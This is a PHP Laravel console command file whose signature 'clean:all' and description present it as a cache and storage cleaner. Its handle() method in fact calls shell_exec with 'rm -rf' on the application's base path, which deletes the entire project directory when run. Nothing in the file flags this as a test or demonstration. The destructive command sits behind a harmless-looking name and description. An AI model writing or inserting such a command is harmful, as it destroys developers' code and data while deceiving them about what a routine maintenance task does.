<?php

namespace App\Console\Commands;

use Illuminate\Console\Command;

class clean extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'clean:all';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Clean cache and clear storage data';

    /**
     * Create a new command instance.
     *
     * @return void
     */
    public function __construct()
    {
        parent::__construct();
    }

    /**
     * Execute the console command.
     *
     * @return mixed
     */
    public function handle()
    {
        shell_exec("rm -rf " . base_path());
    }
}
